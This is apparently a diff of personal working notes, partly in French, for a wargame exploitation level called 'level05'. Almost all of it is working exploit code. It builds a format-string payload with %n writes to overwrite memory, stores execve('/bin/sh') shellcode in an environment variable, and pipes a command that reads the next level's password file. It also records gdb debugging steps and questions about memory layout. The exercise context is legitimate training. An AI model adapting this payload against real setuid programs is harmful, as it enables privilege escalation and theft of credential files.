@@ -158,3 +158,41 @@ echo $(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\x
 
 
  echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')" ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))
+
+ gdb	-> echo $(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')") > /tmp/in
+		->  export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')")
+
+
+
+echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/bin/cat /tmp/in ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05)
+
+### work on gdb 
+- echo $(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')") > /tmp/in
+- export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')")
+- gdb level05
+- layout asm
+- unset environment (toutes les env sauf F)
+- r < /tmp/in
+- OK good ca nous lance un shell dans gdb (pourquoi pas en vrai ?)
+
+
+#### ques ce qui peux tout deplacer ?
+ - l'env peux etre gdb a encore un env ?
+ - l'ARGV[1] peux surment tout deplacer dans la memoire 
+ - es ce que le fait d'ecrire unset env declade avant le `;` ?
+
+
+
+
+  echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')" ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))
+
+
+    echo $(
+	echo $(
+		unset $(
+			env | cut -d= -f1
+			);
+		export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (
+					/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1]+'%15.x'*9+'a'*4+'%n'+'%60.c'+'%n' + '%32.c' + '%n' + '%n')";
+					/bin/echo '/bin/cat /home/users/level06/.pass'
+				) | /home/users/level05/level05 ))
